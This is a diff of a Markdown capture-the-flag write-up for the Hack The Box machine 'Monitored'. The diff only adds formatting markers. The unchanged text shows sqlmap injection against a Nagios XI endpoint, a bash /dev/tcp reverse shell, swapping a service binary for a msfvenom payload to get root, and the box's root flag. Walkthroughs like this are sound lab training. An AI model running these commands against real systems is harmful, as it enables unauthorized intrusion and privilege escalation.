@@ -55,6 +55,7 @@ PORT      STATE    SERVICE    VERSION
 10001/tcp filtered scp-config
 Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+{: .nolineno}
 {: file='Nmap_Results.txt' .nolineno}
 ## Web Enumeration ⤵️
 
@@ -86,11 +87,13 @@ PORT      STATE         SERVICE  REASON
 58640/udp open|filtered unknown  no-response
 ```
 {: .nolineno}
+{: .nolineno}
 
 For Enumeration I used <mark style="background: #FFB86CA6;">snmpbulkwalk</mark> Tool as I can also use <mark style="background: #FFB86CA6;">snmpwalk</mark> Tool but for fast output I preferred this tool ⏬
 ```bash
 sudo snmpbulkwalk -v2c -c public -Cn0 -Cr10 10.10.11.248 >> snmpbulkwalk_output.txt
 ```
+{: .nolineno}
 {: .nolineno}
 ![Image](Pasted%20image%2020240417131436.png)
 
@@ -107,6 +110,7 @@ So I had to dig deeper into the <mark style="background: #D2B3FFA6;">api</mark> 
 feroxbuster -u https://nagios.monitored.htb/ -k -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -t 100 --depth 5 -C 403,404,503,502 -o ferox_all.json
 ```
 {: .nolineno}
+{: .nolineno}
 ![Image](Pasted%20image%2020240417145509.png)
 
 Also going deeper and found there ⏬
@@ -114,6 +118,7 @@ Also going deeper and found there ⏬
 ```bash
 feroxbuster -u https://nagios.monitored.htb/nagiosxi/api/ -k -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -t 100
 ```
+{: .nolineno}
 {: .nolineno}
 ![Image](Pasted%20image%2020240417145726.png)
 
@@ -149,6 +154,7 @@ Lets use **sqlmap** to do this attack ⏬
 ┌──(kali㉿kali)-[~/Downloads/HTB/Monitored]
 └─$ sudo sqlmap --flush-session -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=1" --batch --cookie="nagiosxi=badl0hq9bnkpfsvg9s5f5q016f" --dump -p id --dbms=mysql --threads=10
 ```
+{: .nolineno}
 {: .nolineno}
 
 ![Image](Pasted%20image%2020240418101217.png)
@@ -226,6 +232,7 @@ Now I will be adding a reverse shell command ⏬
 bash -c 'bash -i >& /dev/tcp/10.10.16.17/4444 0>&1'
 ```
 {: .nolineno}
+{: .nolineno}
 
 Save it and Now move to services to use that command that I made right now ⏬
 
@@ -265,6 +272,7 @@ uid=1001(nagios) gid=1001(nagios) groups=1001(nagios),1002(nagcmd)
 nagios@monitored:~$ 
 ```
 {: .nolineno}
+{: .nolineno}
 
 For root privileges I checked `sudo -l` and got this ⏬
 
@@ -302,6 +310,7 @@ User nagios may run the following commands on localhost:
 nagios@monitored:~$ 
 ```
 {: .nolineno}
+{: .nolineno}
 
 This script `/usr/local/nagiosxi/scripts/manage_services.sh` takes 2 arguments that means I can play with these arguments : 
 
@@ -310,6 +319,7 @@ This script `/usr/local/nagiosxi/scripts/manage_services.sh` takes 2 arguments t
 first=("start" "stop" "restart" "status" "reload" "checkconfig" "enable" "disable")
 second=("postgresql" "httpd" "mysqld" "nagios" "ndo2db" "npcd" "snmptt" "ntpd" "crond" "shellinaboxd" "snmptrapd" "php-fpm")
 ```
+{: .nolineno}
 {: .nolineno}
 
 So What I will be doing is that , I will be replacing the <span style="color:#00ff91">nagios</span> executable from a reverse shell <span style="color:#00ff91">nagios</span> file .
@@ -326,6 +336,7 @@ Final size of elf file: 207 bytes
 Saved as: nagios
 ```
 {: .nolineno}
+{: .nolineno}
 
 I transferred it to the place where the original <span style="color:#00ff91">nagios</span> was stored and Now lets start the **msfconsole** that gona catch the reverse shell when it will be triggered , Lastly run this script as root user ⏬
 
@@ -336,6 +347,7 @@ Job for nagios.service failed because a timeout was exceeded.
 See "systemctl status nagios.service" and "journalctl -xe" for details.
 nagios@monitored:~$ 
 ```
+{: .nolineno}
 {: .nolineno}
 
 I got the reverse shell in metasploit ⏬
@@ -365,6 +377,7 @@ cat root.txt
 7baaeba08119966c9ba14a0017484bc5
 root@monitored:/root#
 ```
+{: .nolineno}
 {: .nolineno}
 
 I am root now !!
